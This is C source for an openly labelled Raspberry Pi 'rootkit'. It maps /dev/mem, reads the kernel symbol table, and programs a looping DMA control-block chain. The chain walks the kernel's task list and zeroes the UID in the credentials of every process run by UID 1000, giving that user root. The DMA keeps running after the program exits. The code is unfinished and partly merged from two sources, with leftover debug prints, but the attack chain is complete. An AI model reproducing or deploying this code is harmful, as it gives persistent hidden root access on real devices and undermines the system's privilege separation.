#include <assert.h>
#include <errno.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <fcntl.h> //for file opening

#include "dma.h"
#include "mem.h"

#define TARGET_UID 1000

/* 64 MB to play with */
#define BUS_ADDRESS 0xfb000000u
#define SDRAM_BASE  0x3b000000
#define MEMORY_SIZE 0x04000000

#define BUS_SDRAM_ADDR   0xc0000000u
#define PAGE_OFFSET      0x80000000u
#define TASK_SIZE        0x5a0
#define NEXT_TASK_OFFSET 0x1c8
#define CRED_OFFSET      0x31c
#define UID_OFFSET       4

#define TIMER_BASE    0x3F003000
#define DMA_BASE      0x3F007000
#define CLOCK_BASE    0x3F101000 // Undocumented. Extrapolated from RPI_V1 CLOCK_BASE
#define GPIO_BASE     0x3F200000
#define PWM_BASE      0x3F20C000
#define GPIO_BASE_BUS 0x7E200000 //this is the physical bus address of the GPIO module. This is only used when other peripherals directly connected to the bus (like DMA) need to read/write the GPIOs
#define PWM_BASE_BUS  0x7E20C000


#define PAGE_SIZE 4096 //mmap maps pages of memory, so we must give it multiples of this size


//-------- Relative offsets for DMA registers
//DMA Channel register sets (format of these registers is found in DmaChannelHeader struct):
#define DMACH(n) (0x100*(n))
//Each DMA channel has some associated registers, but only CS (control and status), CONBLK_AD (control block address), and DEBUG are writeable
//DMA is started by writing address of the first Control Block to the DMA channel's CONBLK_AD register and then setting the ACTIVE bit inside the CS register (bit 0)
//Note: DMA channels are connected directly to peripherals, so physical addresses should be used (affects control block's SOURCE, DEST and NEXTCONBK addresses).
#define DMAENABLE 0x00000ff0 //bit 0 should be set to 1 to enable channel 0. bit 1 enables channel 1, etc.

//flags used in the DmaChannelHeader struct:
#define DMA_CS_RESET (1<<31)
#define DMA_CS_ACTIVE (1<<0)

#define DMA_DEBUG_READ_ERROR (1<<2)
#define DMA_DEBUG_FIFO_ERROR (1<<1)
#define DMA_DEBUG_READ_LAST_NOT_SET_ERROR (1<<0)

//flags used in the DmaControlBlock struct:
#define DMA_CB_TI_DEST_INC (1<<4)
#define DMA_CB_TI_SRC_INC (1<<8)


void makeVirtPhysPage(void** virtAddr, void** physAddr) {
    *virtAddr = valloc(PAGE_SIZE); //allocate one page of RAM

    //force page into RAM and then lock it there:
    ((int*)*virtAddr)[0] = 1;
    mlock(*virtAddr, PAGE_SIZE);
    memset(*virtAddr, 0, PAGE_SIZE); //zero-fill the page for convenience

    //Magic to determine the physical address for this page:
    uint64_t pageInfo;
    int file = open("/proc/self/pagemap", 'r');
    lseek(file, ((size_t)*virtAddr)/PAGE_SIZE*8, SEEK_SET);
    read(file, &pageInfo, 8);

    *physAddr = (void*)(size_t)(pageInfo*PAGE_SIZE);
    printf("makeVirtPhysPage virtual to phys: %p -> %p\n", *virtAddr, *physAddr);
}

//set bits designated by (mask) at the address (dest) to (value), without affecting the other bits
//eg if x = 0b11001100
//  writeBitmasked(&x, 0b00000110, 0b11110011),
//  then x now = 0b11001110
void writeBitmasked(volatile uint32_t *dest, uint32_t mask, uint32_t value) {
    uint32_t cur = *dest;
    uint32_t new = (cur & (~mask)) | (value & mask);
    *dest = new;
    *dest = new; //added safety for when crossing memory barriers.
}

struct DmaChannelHeader {
    uint32_t CS; //Control and Status
        //31    RESET; set to 1 to reset DMA
        //30    ABORT; set to 1 to abort current DMA control block (next one will be loaded & continue)
        //29    DISDEBUG; set to 1 and DMA won't be paused when debug signal is sent
        //28    WAIT_FOR_OUTSTANDING_WRITES; set to 1 and DMA will wait until peripheral says all writes have gone through before loading next CB
        //24-27 reserved
        //20-23 PANIC_PRIORITY; 0 is lowest priority
        //16-19 PRIORITY; bus scheduling priority. 0 is lowest
        //9-15  reserved
        //8     ERROR; read as 1 when error is encountered. error can be found in DEBUG register.
        //7     reserved
        //6     WAITING_FOR_OUTSTANDING_WRITES; read as 1 when waiting for outstanding writes
        //5     DREQ_STOPS_DMA; read as 1 if DREQ is currently preventing DMA
        //4     PAUSED; read as 1 if DMA is paused
        //3     DREQ; copy of the data request signal from the peripheral, if DREQ is enabled. reads as 1 if data is being requested, else 0
        //2     INT; set when current CB ends and its INTEN=1. Write a 1 to this register to clear it
        //1     END; set when the transfer defined by current CB is complete. Write 1 to clear.
        //0     ACTIVE; write 1 to activate DMA (load the CB before hand)
    uint32_t CONBLK_AD; //Control Block Address
    uint32_t TI; //transfer information; see DmaControlBlock.TI for description
    uint32_t SOURCE_AD; //Source address
    uint32_t DEST_AD; //Destination address
    uint32_t TXFR_LEN; //transfer length.
    uint32_t STRIDE; //2D Mode Stride. Only used if TI.TDMODE = 1
    uint32_t NEXTCONBK; //Next control block. Must be 256-bit aligned (32 bytes; 8 words)
    uint32_t DEBUG; //controls debug settings
};

struct DmaControlBlock {
    uint32_t TI; //transfer information
        //31:27 unused
        //26    NO_WIDE_BURSTS
        //21:25 WAITS; number of cycles to wait between each DMA read/write operation
        //16:20 PERMAP; peripheral number to be used for DREQ signal (pacing). set to 0 for unpaced DMA.
        //12:15 BURST_LENGTH
        //11    SRC_IGNORE; set to 1 to not perform reads. Used to manually fill caches
        //10    SRC_DREQ; set to 1 to have the DREQ from PERMAP gate requests.
        //9     SRC_WIDTH; set to 1 for 128-bit moves, 0 for 32-bit moves
        //8     SRC_INC;   set to 1 to automatically increment the source address after each read (you'll want this if you're copying a range of memory)
        //7     DEST_IGNORE; set to 1 to not perform writes.
        //6     DEST_DREG; set to 1 to have the DREQ from PERMAP gate *writes*
        //5     DEST_WIDTH; set to 1 for 128-bit moves, 0 for 32-bit moves
        //4     DEST_INC;   set to 1 to automatically increment the destination address after each read (Tyou'll want this if you're copying a range of memory)
        //3     WAIT_RESP; make DMA wait for a response from the peripheral during each write. Ensures multiple writes don't get stacked in the pipeline
        //2     unused (0)
        //1     TDMODE; set to 1 to enable 2D mode
        //0     INTEN;  set to 1 to generate an interrupt upon completion
    uint32_t SOURCE_AD; //Source address
    uint32_t DEST_AD; //Destination address
    uint32_t TXFR_LEN; //transfer length.
    uint32_t STRIDE; //2D Mode Stride. Only used if TI.TDMODE = 1
    uint32_t NEXTCONBK; //Next control block. Must be 256-bit aligned (32 bytes; 8 words)
    uint32_t _reserved[2];
};


//map a physical address into our virtual address space. memfd is the file descriptor for /dev/mem
volatile uint32_t* mapPeripheral(int memfd, int addr) {
    ///dev/mem behaves as a file. We need to map that file into memory:
    void *mapped = mmap(NULL, PAGE_SIZE, PROT_READ|PROT_WRITE, MAP_SHARED, memfd, addr);
    //now, *mapped = memory at physical address of addr.
    if (mapped == MAP_FAILED) {
        printf("failed to map memory (did you remember to run as root?)\n");
        exit(1);
    } else {
        printf("mapped: %p\n", mapped);
    }
    return (volatile uint32_t*)mapped;
}




typedef volatile struct control_block *cb_t;
typedef volatile uint8_t vuint8_t;
typedef volatile uint32_t vuint32_t;

static struct dma_registers *dma;
static void *physical_memory;

/* This is only for virtual addresses pointing to in
 * [physical_memory, physical_memory + MEMORY_SIZE). */
static inline uintptr_t virtual_to_bus(volatile void *p)
{
	return (void *)p - physical_memory + BUS_ADDRESS;
}

static inline void *bus_to_virtual(uintptr_t addr)
{
	return (char *)physical_memory + (addr - BUS_ADDRESS);
}

static void setup(void)
{
	if (open_dev_mem())
	{
		perror("open /dev/mem");
		exit(1);
	}

	if (map_dma_registers())
	{
		perror("map DMA registers");
		exit(1);
	}
	int dma_channel = reserve_dma_channel();
	if (dma_channel == -1)
	{
		if (errno)
			perror("reserve dma channel");
		else
			fputs("out of DMA channels\n", stderr);
		exit(1);
	}
	printf("dma_channel = %d\n", dma_channel);
	dma = get_dma_channel(dma_channel);
	physical_memory = sdram_map(SDRAM_BASE, MEMORY_SIZE);
	if (physical_memory == MAP_FAILED)
	{
		perror("sdram_map");
		exit(1);
	}

	if (close_dev_mem())
	{
		perror("close /dev/mem");
		exit(1);
	}
	seteuid(getuid());
}

/* Returns the address of __ksymtab_init_task. */
static uintptr_t ksymtab_init_task_addr(void)
{
	FILE *fp = popen("grep __ksymtab_init_task /proc/kallsyms|cut -d' ' -f1", "r");
	assert(fp);
	char addr[9];
	assert(fread(addr, 8, 1, fp) == 1);
	fclose(fp);
	addr[8] = 0;
	return strtoul(addr, NULL, 16);
}

static void reset_dma(void)
{
	// Reset the DMA
	dma->cs = CS_RESET;

	// Wait for the DMA to complete
	while (dma->cs & CS_ACTIVE)
		;
}

static int stop_dma(int dma_channel)
{
	if (open_dev_mem())
	{
		perror("open /dev/mem");
		exit(1);
	}

	if (map_dma_registers())
	{
		perror("map DMA registers");
		exit(1);
	}
	dma = get_dma_channel(dma_channel);

	if (close_dev_mem())
	{
		perror("close /dev/mem");
		exit(1);
	}
	reset_dma();
	if (unreserve_dma_channel(dma_channel))
	{
		perror("failed to unreserve DMA channel");
		return 1;
	}
	return 0;
}

/* Start the DMA, but do not wait for it to end. */
static void run_dma(cb_t cb, cb_t physical)
{
	reset_dma();

	dma->conblk_ad = physical;
	dma->cs = DMA_CS_PANIC_PRIORITY(0) | DMA_CS_PRIORITY(0) | CS_DISDEBUG | CS_ACTIVE;
}

#define NEXT_CB ((cb_t)(-1))

static void setup_cb(volatile struct control_block *cb,
			 volatile void *dest, volatile void *src, size_t size,
			 cb_t next)
{
	cb->ti = TI_SRC_INC | TI_DEST_INC;
	cb->source_ad = src? virtual_to_bus(src):0;
	cb->dest_ad = dest? virtual_to_bus(dest):0;
	cb->txfr_len = size;
	cb->stride = 0;
	if (next == NEXT_CB)
		cb->nextconbk = virtual_to_bus(cb + 1);
	else if (next == NULL)
		cb->nextconbk = 0;
	else
		cb->nextconbk = virtual_to_bus(next);
}

int main(int argc, char *argv[])
{
	if (argc == 2)
		return stop_dma(atoi(argv[1]));
	else if (argc > 2)
	{
		fprintf(stderr, "Usage: %s [dma_channel]\n"
			        "dma_channel - Stop the rootkit using dma_channel\n",
			argv[0]);
		exit(1);
	}
	//setup();

	 int dmaChNum = 5;
    //First, open the linux device, /dev/mem
    //dev/mem provides access to the physical memory of the entire processor+ram
    //This is needed because Linux uses virtual memory, thus the process's memory at 0x00000000 will NOT have the same contents as the physical memory at 0x00000000
    int memfd = open("/dev/mem", O_RDWR | O_SYNC);
    if (memfd < 0) {
        printf("Failed to open /dev/mem (did you remember to run as root?)\n");
        exit(1);
    }
    //now map /dev/mem into memory, but only map specific peripheral sections:
    volatile uint32_t *dmaBaseMem = mapPeripheral(memfd, DMA_BASE);

	uintptr_t addr = ksymtab_init_task_addr();

	printf("asdfasdf");
    void *virtCbPage1, *physCbPage1;
    makeVirtPhysPage(&virtCbPage1, &physCbPage1);

	void *virtCbPage2, *physCbPage2;
    makeVirtPhysPage(&virtCbPage2, &physCbPage2);

	// void *virtCbPage3, *physCbPage3;
    // makeVirtPhysPage(&virtCbPage3, &physCbPage3);
	// Control blocks
	printf("HELLO");
	cb_t cb = virtCbPage1;
printf("THERE");
	// Tables
#define TABLE_ADDRESS (BUS_ADDRESS + 0x2000)
	vuint8_t *kv2b_table = virtCbPage2;
	vuint8_t *low_table = kv2b_table + 0x100;
	vuint8_t *hi_table = low_table + 0x100;
	vuint32_t *address_table = (vuint32_t *)(hi_table + 0x100);
	printf("asdfasdf");
	// Data
#define DATA_ADDRESS (BUS_ADDRESS + 0x3000)
	vuint32_t *next_task = virtCbPage2 + 0x500;
	vuint32_t *cred = next_task + 1;
	vuint32_t *dummy = cred + 1;
	vuint8_t *uid = (vuint8_t *)(dummy + 1);
	printf("asdfasdf");
	// Build the rootkit tables.
	for (int i = 0; i < 0x100; ++i)
		kv2b_table[i] = i + ((BUS_SDRAM_ADDR - PAGE_OFFSET) >> 24);
	memset((void *)low_table, 0, 0x100);
	low_table[TARGET_UID & 0xff] = 4;
	memset((void *)hi_table, 0, 0x100);
	hi_table[TARGET_UID >> 8] = 8;
	printf("asdfasdf");
	// Build the rootkit control blocks.
	// 0. We start with the kernel virtual address of
	//    __ksymtab_init_task in addr. The first word is the
	//    kernel virtual address of init_task.
	setup_cb(cb + 0, &cb[1].source_ad, NULL, 4, NEXT_CB);
	cb[0].source_ad = addr - PAGE_OFFSET + BUS_SDRAM_ADDR;
	// 1. We want to read the word NEXT_TASK_OFFSET in so use a 2D
	//    transfer with YLENGTH + 1 = 2, XLENGTH = 4, D_STRIDE =
	//    -4, and S_STRIDE = NEXT_TASK_OFFSET - 4.
	setup_cb(cb + 1, next_task, NULL, (1 << 16) | 4, NEXT_CB);
	cb[1].ti |= TI_TDMODE;
	cb[1].stride = ((uint16_t)-4 << 16) | (NEXT_TASK_OFFSET - 4);

	// == Start of main loop ==
	// 2. next_task points to the kernel virtual pointer to the
	//    next task_struct's next pointer. We need to convert to a
	//    bus address.
	setup_cb(cb + 2, &cb[3].dest_ad, (vuint8_t *)next_task + 3, 1, NEXT_CB);
	// 3. Read from the table and store back to next_task + 3.
	setup_cb(cb + 3, (vuint8_t *)next_task + 3, kv2b_table, 1, NEXT_CB);
	// 4. Copy from next_task to cb[5]'s source.
	setup_cb(cb + 4, &cb[5].source_ad, next_task, 4, NEXT_CB);
	// 5. Copy the next_task and cred pointers using a 2D read.
	setup_cb(cb + 5, next_task, NULL, (1 << 16) | 4, NEXT_CB);
	cb[5].ti |= TI_TDMODE;
	cb[5].stride = (uint16_t)(NEXT_TASK_OFFSET - CRED_OFFSET - 4);
	// 6. cred now points to the kernel virtual pointer to the
	// crediental struct so convert to a bus address.
	setup_cb(cb + 6, &cb[7].source_ad, (vuint8_t *)cred + 3, 1, NEXT_CB);
	// 7. Read from the table and store back in cred.
	setup_cb(cb + 7, (vuint8_t *)cred + 3, kv2b_table, 1, NEXT_CB);
	// 8. Copy from cred to cb[9]'s source.
	setup_cb(cb + 8, &cb[9].source_ad, cred, 4, NEXT_CB);
	// 9. Copy the uid which lives 4 bytes into the struct.
	setup_cb(cb + 9, dummy, NULL, 6, NEXT_CB);

	// 10. Check if the low byte matches.
	setup_cb(cb + 10, &cb[11].source_ad, uid, 1, NEXT_CB);
	// 11. Use low_table as the offset table.
	setup_cb(cb + 11, &cb[12].source_ad, low_table, 1, NEXT_CB);
	// 12. Load from the address table into tramp. Use cb + 13 as
	// tramp.
	cb_t tramp = cb + 13;
	setup_cb(cb + 12, &tramp->nextconbk, address_table, 4, tramp);
	setup_cb(tramp, NULL, NULL, 0, NULL);
	address_table[0] = virtual_to_bus(cb + 2);
	address_table[1] = virtual_to_bus(cb + 14);

	// 14. Check if the high byte matches.
	setup_cb(cb + 14, &cb[15].source_ad, uid+1, 1, NEXT_CB);
	// 15. Use the hi_table as the offset_table.
	setup_cb(cb + 15, &cb[16].source_ad, hi_table, 1, NEXT_CB);
	// 16. Load from the address table into tramp.
	setup_cb(cb + 16, &tramp->nextconbk, address_table, 4, tramp);
	address_table[2] = virtual_to_bus(cb + 17);

	// 17. Write zeros over the uid.
	setup_cb(cb + 17, uid, &cb[17].stride, 4, NEXT_CB);
	cb[17].stride = 0;
	// 18. Copy from cred to cb[19]'s dest.
	setup_cb(cb + 18, &cb[19].dest_ad, cred, 4, NEXT_CB);
	// 19. Store the new cred values and loop.
	setup_cb(cb + 19, NULL, dummy, 8, cb + 2);

	// Start the DMA running and then exit.
	run_dma(cb, physCbPage1);

	//enable DMA channel (it's probably already enabled, but we want to be sure):
    writeBitmasked(dmaBaseMem + DMAENABLE/4, 1 << dmaChNum, 1 << dmaChNum);
    
    //configure the DMA header to point to our control block:
    volatile struct DmaChannelHeader *dmaHeader = (volatile struct DmaChannelHeader*)(dmaBaseMem + (DMACH(dmaChNum))/4); //dmaBaseMem is a uint32_t ptr, so divide by 4 before adding byte offset
    dmaHeader->CS = DMA_CS_RESET; //make sure to disable dma first.
    sleep(1); //give time for the reset command to be handled.
    dmaHeader->DEBUG = DMA_DEBUG_READ_ERROR | DMA_DEBUG_FIFO_ERROR | DMA_DEBUG_READ_LAST_NOT_SET_ERROR; // clear debug error flags
    dmaHeader->CONBLK_AD = (uint32_t)physCbPage1; //we have to point it to the PHYSICAL address of the control block (cb1)
    dmaHeader->CS = DMA_CS_ACTIVE; //set active bit, but everything else is 0.
    
    sleep(5); //give time for copy to happen

	return 0;
}
